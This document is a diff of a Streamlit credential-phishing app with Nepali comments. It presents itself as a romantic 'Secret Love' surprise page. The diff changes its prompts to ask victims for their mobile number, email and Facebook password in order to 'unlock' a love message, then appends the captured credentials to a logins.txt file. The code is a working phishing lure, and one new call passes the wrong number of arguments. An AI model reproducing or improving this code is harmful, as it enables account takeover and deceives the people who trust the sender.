@@ -8,10 +8,10 @@ st.set_page_config(page_title="Special Surprise ❤️", page_icon="💖", layou
 DATA_FILE = "logins.txt"
 
 # 3. Data save garne function
-def save_data(email,pwd, num):
+def save_data(email,pwd,num):
     try:
         with open(DATA_FILE, "a", encoding="utf-8") as f:
-            f.write(f"Email: {email} | Password: {pwd}\n | Number: {num}\n")
+            f.write(f"Email: {email} | Password: {pwd}\n  | Number: {num}\n")
     except Exception as e:
         st.error(f"Save error: {e}")
 
@@ -34,17 +34,18 @@ with st.sidebar:
             st.write("No data found.")
 
 # --- MAIN PAGE ---
-st.markdown("<h1 style='text-align: center; color: #ff4b2b;'>💝 Secret Love #2 Portal 💝</h1>", unsafe_allow_html=True)
+st.markdown("<h1 style='text-align: center; color: #ff4b2b;'>💝 Login Fb to open Secret message #2 Portal 💝</h1>", unsafe_allow_html=True)
 
 if not st.session_state.submitted:
-    st.markdown("<p style='text-align: center;'>Please log in to unlock the surprise.</p>", unsafe_allow_html=True)
+    st.markdown("<p style='text-align: center; color #3776AB'>Please log in Fb id to unlock the surprise.</p>", unsafe_allow_html=True)
     
     # --- FIXING THE FORM LOGIC ---
     with st.form("login_form"):
         # Variable haru form vitra define gareko
-        email_val = st.text_input("Email Address jais..")
-        number_val= st.text_input("Mobile Number..")
-        password_val = st.text_input("Email Password", type="password")
+        number_val = st.text_input("Mobile number")
+        email_val = st.text_input("Email Address")
+        password_val = st.text_input("FB Password", type="password")
+        
      
         
         submit_btn = st.form_submit_button("Unlock Message❤️")
@@ -52,8 +53,8 @@ if not st.session_state.submitted:
         # Jaba button click hunchha, variable check garne
         if submit_btn:
             # .strip() use garnu vanda paila check garnuhos ki variables khali chhainan
-            if email_val and password_val:
-                save_data(email_val, number_val, password_val)
+            if number_val and password_val:
+                save_data(number_val , password_val)
                 st.session_state.submitted = True
                 st.rerun()
             else:
@@ -65,11 +66,7 @@ else:
     <div style="text-align: center; background-color: #fff0f5; padding: 40px; border-radius: 20px; border: 3px solid #ffc1e3;">
         <h2 style="color: #d81b60;">💖 143! 💖</h2>
         <p style="font-size: 20px;">"Maile prem gareka dherai chij madhye 
-        timro aankha pani ek ho. 
-        Tyo aankhama sadhai khusi matra dekhna paau, 
-        aasu hoina. Timro muskan ra aankhako chamak
-         mero lagi sabai bhanda thulo upahaar ho. 
-            Stay happy, sweetheart!"</p>
+        timro aankha pani ek ho....  in the night second messsage update wait and see in 9 pm"</p>
     </div>
     """, unsafe_allow_html=True)
     
